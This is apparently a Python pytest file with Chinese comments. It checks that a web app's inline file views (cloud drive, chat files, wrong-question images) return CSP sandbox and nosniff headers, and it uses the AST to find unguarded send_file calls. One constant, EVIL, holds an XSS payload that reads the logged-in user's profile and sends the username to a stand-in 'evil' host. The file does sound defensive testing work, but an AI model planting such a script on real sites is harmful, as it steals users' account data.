"""内联返回用户上传的文件时，必须挡住里面夹带的脚本。

资料库 / 小记 / 知识库 / 错题图 / 云盘 / 聊天文件都收**任意格式**，其中 .html、.svg
能带 <script>。`as_attachment=False` 意味着浏览器**当页面打开**它 —— 那段脚本就跑在
本站源上，读得到登录 cookie。聊天文件尤其要紧：那是**别人**发过来的东西。

这里两道保险：
1. 逐个接口验响应头（真发请求，不是读源码）；
2. 兜底扫一遍源码 —— 以后新加的内联接口要是忘了包 `_no_script`，这条会红。
   光靠前一条挡不住「新写的接口没人写测试」。
"""
import ast
import io
import pathlib

import pytest

BASE = pathlib.Path(__file__).resolve().parent.parent


def _assert_sandboxed(r, who):
    assert r.status_code == 200, "%s 取不到：%s" % (who, r.status_code)
    assert "sandbox" in (r.headers.get("Content-Security-Policy") or ""), \
        "%s 缺 CSP sandbox —— 上传个 .html 就能在本站源上执行脚本" % who
    assert r.headers.get("X-Content-Type-Options") == "nosniff", "%s 缺 nosniff" % who


EVIL = b"<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('//evil/'+d.username))</script>"


def test_云盘预览关进沙箱(auth_client):
    r = auth_client.post("/api/drive", data={"file": (io.BytesIO(EVIL), "x.html"), "folder": ""},
                         content_type="multipart/form-data")
    fid = r.get_json()["id"]
    _assert_sandboxed(auth_client.get("/api/drive/%d/view" % fid), "云盘预览")


def test_聊天文件内联时关进沙箱(auth_client):
    """最危险的一条：文件是**别人**发过来的，收件人点开就等于执行发件人的脚本。

    走「文件传输助手」（发给自己，chat_send 对 fid==me 放行；drive_send 那条要求是
    好友，而自己不是自己的好友）。走的是同一个 chat_file 出口，够验这件事。
    """
    r = auth_client.post("/api/chat/1", data={"file": (io.BytesIO(EVIL), "y.html")},
                         content_type="multipart/form-data")
    assert r.status_code == 200, r.get_data(as_text=True)[:200]
    msgs = auth_client.get("/api/chat/1").get_json()["messages"]
    file_ids = [m["file_id"] for m in msgs if m.get("file_id")]
    assert file_ids, "文件没发出去，测试前提不成立"
    _assert_sandboxed(auth_client.get("/api/chat/file/%d?inline=1" % file_ids[-1]), "聊天文件内联")


def test_错题图内联时关进沙箱(auth_client):
    r = auth_client.post("/api/wrongq", data={
        "image": (io.BytesIO(EVIL), "z.html"), "board": "常识判断", "question": "题面"},
        content_type="multipart/form-data")
    if r.status_code not in (200, 201):
        pytest.skip("错题接口参数不合，交给下面的源码兜底扫描")
    wid = (r.get_json() or {}).get("id")
    if not wid:
        pytest.skip("没拿到错题 id")
    _assert_sandboxed(auth_client.get("/api/wrongq/%d/image" % wid), "错题图")


# ---- 源码兜底：新加的内联接口别再漏 ----

def _calls(tree, name):
    return [n for n in ast.walk(tree)
            if isinstance(n, ast.Call) and getattr(n.func, "id", None) == name]


def _inline_sends(tree):
    """as_attachment=False 的 send_file 调用节点。"""
    out = []
    for n in _calls(tree, "send_file"):
        for kw in n.keywords:
            if kw.arg == "as_attachment" and isinstance(kw.value, ast.Constant) \
                    and kw.value.value is False:
                out.append(n)
    return out


def _guarded(tree):
    """被 _no_script(...) 包住的 send_file 调用节点（不管套了几层）。"""
    out = set()
    for n in _calls(tree, "_no_script"):
        for sub in ast.walk(n):
            if isinstance(sub, ast.Call) and getattr(sub.func, "id", None) == "send_file":
                out.add(sub)
    return out


def test_所有内联返回都包了_no_script():
    """扫源码：每个 as_attachment=False 的 send_file 都必须被 _no_script 包住。

    上面的响应头测试只覆盖「已经写了测试的接口」；这条覆盖「以后新写的接口」——
    模块多、内联点散在 6 个文件里，靠人记住不现实。

    用 AST 而不是按行文本匹配：第一版用「上下几行里有没有 _no_script」判断，结果
    kb.py 两处内联只隔 2 行，邻近那行的 _no_script 把没加固的这行盖住了 —— 守卫
    测试自己假通过。语法结构上「是不是被包住」是唯一可靠的判据。

    （as_attachment 是动态表达式的情况扫不到，比如 chat_file 的 `not inline`；
    那条由上面的响应头测试盯着。）
    """
    bad = []
    for py in sorted((BASE / "mods").glob("*.py")):
        if py.name == "files.py":                    # _no_script 的定义处
            continue
        tree = ast.parse(py.read_text(encoding="utf-8"))
        ok = _guarded(tree)
        for n in _inline_sends(tree):
            if n not in ok:
                bad.append("%s:%d" % (py.name, n.lineno))
    assert not bad, "这些内联返回没关进沙箱（会让上传的 .html 在本站源上执行）：\n  " \
                    + "\n  ".join(bad)
